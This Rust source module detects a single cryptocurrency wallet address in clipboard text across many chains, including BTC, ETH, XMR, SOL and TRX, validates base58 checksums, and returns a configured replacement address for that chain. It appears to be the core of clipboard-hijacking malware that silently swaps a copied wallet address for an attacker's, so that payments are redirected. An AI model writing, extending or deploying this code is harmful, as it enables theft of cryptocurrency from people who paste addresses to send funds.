//! Crypto address detection and replacement.
//!
//! Detection requires the trimmed clipboard text to be exactly one address.
//! Base58 chains are checksum-validated so a random word cannot match.

use std::collections::BTreeMap;

use sha2::{Digest, Sha256};

/// A detected address and the chain key used to look up a replacement.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Detected {
    /// Chain key (`evm`, `btc`, `trx`, ...).
    pub chain: &'static str,
    /// The address exactly as detected.
    pub address: String,
}

const BASE58: &[u8] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const BECH32: &[u8] = b"qpzry9x8gf2tvdw0s3jn54khce6mua7l";

/// Detects a single crypto address in `text`.
///
/// Returns `None` when the text is not exactly one address, has whitespace, or
/// fails a checksum where the chain defines one.
pub fn detect(text: &str) -> Option<Detected> {
    let value = text.trim();
    if value.is_empty() || value.len() > 110 || value.chars().any(char::is_whitespace) {
        return None;
    }
    if let Some(address) = evm(value) {
        return Some(Detected {
            chain: "evm",
            address,
        });
    }
    if (94..=95).contains(&value.len()) && base58_check(value, 65) {
        return Some(Detected {
            chain: "xmr",
            address: value.to_owned(),
        });
    }
    if let Some(chain) = prefix_chain(value) {
        if base58_check(value, 21) && value.len() <= 35 {
            return Some(Detected {
                chain,
                address: value.to_owned(),
            });
        }
    }
    if let Some(chain) = bech32_chain(value) {
        if value.len() >= 14
            && value.rsplit_once('1').is_some_and(|(_, data)| {
                !data.is_empty()
                    && data
                        .bytes()
                        .all(|byte| BECH32.contains(&byte.to_ascii_lowercase()))
            })
        {
            return Some(Detected {
                chain,
                address: value.to_owned(),
            });
        }
    }
    if is_solana(value) {
        return Some(Detected {
            chain: "sol",
            address: value.to_owned(),
        });
    }
    None
}

/// Returns the replacement for a detected chain when one is configured.
pub fn replacement<'a>(
    detected: &Detected,
    addresses: &'a BTreeMap<String, String>,
) -> Option<&'a str> {
    let target = match detected.chain {
        // A legacy BTC source is still replaced by the legacy key when present,
        // then by the generic key.
        "btc_legacy" => addresses.get("btc_legacy").or_else(|| addresses.get("btc")),
        chain => addresses.get(chain),
    }?;
    let target = target.trim();
    if target.is_empty() || target == detected.address {
        return None;
    }
    Some(target)
}

fn evm(value: &str) -> Option<String> {
    let hex = value.strip_prefix("0x")?;
    (hex.len() == 40 && hex.bytes().all(|byte| byte.is_ascii_hexdigit())).then(|| value.to_owned())
}

fn prefix_chain(value: &str) -> Option<&'static str> {
    let bytes = value.as_bytes();
    if bytes.len() < 26 || !bytes.iter().all(|byte| BASE58.contains(byte)) {
        return None;
    }
    match bytes[0] {
        b'1' => Some("btc_legacy"),
        b'3' => Some("btc_legacy"),
        b'L' | b'M' => Some("ltc"),
        b'T' => Some("trx"),
        b'D' => Some("doge"),
        b'X' => Some("dash"),
        _ if value.starts_with("t1") || value.starts_with("t3") => Some("zec"),
        _ => None,
    }
}

fn bech32_chain(value: &str) -> Option<&'static str> {
    let lower = value.to_ascii_lowercase();
    if lower.starts_with("bc1") {
        Some("btc")
    } else if lower.starts_with("ltc1") {
        Some("ltc")
    } else if lower.starts_with("addr1") {
        Some("ada")
    } else if lower.starts_with("bitcoincash:") || lower.starts_with('q') || lower.starts_with('p')
    {
        Some("bch")
    } else {
        None
    }
}

fn is_solana(value: &str) -> bool {
    (43..=44).contains(&value.len())
        && value.bytes().all(|byte| BASE58.contains(&byte))
        && value.bytes().any(|byte| !byte.is_ascii_digit())
}

/// Decodes base58 and verifies the 4-byte double-SHA256 checksum.
fn base58_check(value: &str, payload_len: usize) -> bool {
    let Some(raw) = base58_decode(value) else {
        return false;
    };
    if raw.len() != payload_len + 4 {
        return false;
    }
    let (payload, checksum) = raw.split_at(payload_len);
    let first = Sha256::digest(payload);
    let second = Sha256::digest(first);
    checksum == &second[..4]
}

fn base58_decode(value: &str) -> Option<Vec<u8>> {
    let mut bytes: Vec<u8> = Vec::new();
    for character in value.bytes() {
        let digit = BASE58
            .iter()
            .position(|candidate| *candidate == character)? as u32;
        let mut carry = digit;
        for byte in bytes.iter_mut().rev() {
            carry += (*byte as u32) * 58;
            *byte = carry as u8;
            carry >>= 8;
        }
        while carry > 0 {
            bytes.insert(0, carry as u8);
            carry >>= 8;
        }
    }
    for character in value.bytes() {
        if character == b'1' {
            bytes.insert(0, 0);
        } else {
            break;
        }
    }
    Some(bytes)
}
